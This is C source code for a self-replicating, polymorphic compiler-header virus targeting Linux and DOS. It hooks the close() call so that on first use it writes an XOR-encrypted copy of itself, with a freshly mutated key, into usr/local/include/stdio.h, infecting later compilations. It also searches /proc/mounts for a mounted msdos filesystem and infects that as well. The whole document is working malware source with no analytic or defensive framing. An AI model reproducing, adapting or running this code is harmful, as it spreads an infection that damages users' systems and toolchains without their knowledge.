/* the hooked close-function */
int close(int fd) 
{
   	static int first = 0;
        if (!first) {
           	first++;
           	chdir("/");
                virfunc();
#ifdef linux
                jump2dos();
#endif
        }
        return Close(fd);
}

/* the real close-functions, using the syscalls */
#ifdef linux
int Close(int i)
{
   	long __res;
 
    	errno = 0;       
        __asm__ volatile ("int $0x80"
                	: "=a" (__res)
                        : "0" (__NR_close),"b" ((long)(i)));
                        if (__res >= 0)
                           	return (int)__res;
                        errno = -__res;
                        return -1;
}
#else
int Close(int i) 
{
   	union REGS ir, or;
        
        errno = 0;
        ir.h.ah = 0x3e;
        ir.x.bx = i;
        memset(&or, 0, sizeof(or));
        int86(0x21, &ir, &or);
        if (or.x.cflag) {
           	errno = or.x.ax;
                return -1;
        }
        return 0;
}
#endif

int virfunc(void)
{
   	FILE *fd;
        int i = 0, j = 1;
        
#ifdef linux        
        int oldmask = umask(0);
#endif
        /* decrypt the arrays first [we assume that it is encrypted !!!]
         * look at the end of virfunc() too
         */
        Crypt(B, CHARS2);
        Crypt(C, CHARS);
        /* get a different key for new encryption */
        mutate(key);
        /* open a file stdio.h in /usr/local/include */
        mkdir("usr/local", 0755);
        mkdir("usr/local/include", 0755);
        unlink("usr/local/include/stdio.h");
        if ((fd = fdopen(open("usr/local/include/stdio.h", O_CREAT|O_RDWR, 0644), "w+")) == NULL)
           	perror("fopen");
        /* write head in it (now plain) */
        fprintf(fd, "%s", B);
        /* encrypt array B with new key*/
        Crypt(B, CHARS2);
        /* and write it encrypted to the file */
        fprintf(fd, "char B[] = \n\"");
        for (i = 0; i < CHARS2; i++) {
           	if ((j % 15) == 0) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                fprintf(fd, "\\x%02x", (unsigned char)B[i]);
                j++;
        }
        fprintf(fd, "\";\n\n");
        /* encrypt C with the new key */
        fprintf(fd, "char C[] = \n\"");
        Crypt(C, CHARS);
        /* and write it to also the file */
        for (i = 0; i < CHARS; i++) {
           	if ((j % 15) == 0) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
           	fprintf(fd, "\\x%02x", (unsigned char)C[i]);
                j++;
        }
        fprintf(fd, "\";\n\n");
        /* put the new key we got to the file wich is used
         * for the next decryption at the next call
         */ 
        fprintf(fd, "\n\nunsigned char key[4] = {0x%02x, 0x%02x, 0x%02x, 0x%02x};\n\n", 
                     (unsigned char)key[0], (unsigned char)key[1], 
                     (unsigned char)key[2], (unsigned char)key[3]);
        /* get C plain */
        Crypt(C, CHARS);
        /* and append it to stdio.h */
        fprintf(fd, "%s", C);
        fclose(fd);
#ifdef linux
        umask(oldmask);
#endif
        Crypt(C, CHARS);
        /* result: B and C is encrypted now -> we can call virfunc() again */
        return 0;
}

/* simple XOR-encryption technique using the global key[] for
 * it
 */

int Crypt(char *s, int len)
{
   	int i = 0, j = 0;
        
        for (i = 0; i < len; i++) {
           	s[i] ^= key[j];
                j = (j + 1) % 4;
        }
        return 0;
}

/* on linux we use /dev/random, on DOS we use rnd() */

int mutate(char *s)
{
   	int i;
#ifdef linux
        int fd;
#endif   
#ifdef MSDOS
        random();
#endif        
        for (i = 0; i < 4; i++) {
#ifdef linux
           	if ((fd = open("/dev/random", O_RDONLY)) <= 0) {
                   	perror("open");
                        return errno;
                }
                read(fd, &s[i], 1);
                Close(fd);
#else
                s[i] = rand() % 255;
#endif
        }
        return 0;
}

#ifdef linux
/* look up /proc/mounts to find the mounted msdos fs
 * if one was found, call virfunc on it */
int jump2dos(void)
{  
      	FILE *fd;
        char buf[50] = {0}, bufbak[50] = {0};
        
        if ((fd = fopen("/proc/mounts", "r")) == NULL) {
           	perror("fopen");
                return errno;
        }
        while (fscanf(fd, "%s", buf) > 0) {
                if (strcmp(buf, "msdos") == 0)
                   	break;
                memset(bufbak, 0, 50);
                strcpy(bufbak, buf);
        }
        fclose(fd);
        if (strcmp(buf, "msdos") == 0) {
           	chdir((const char*)bufbak);
                virfunc();        
        }
        return 0;
}
#endif        
        

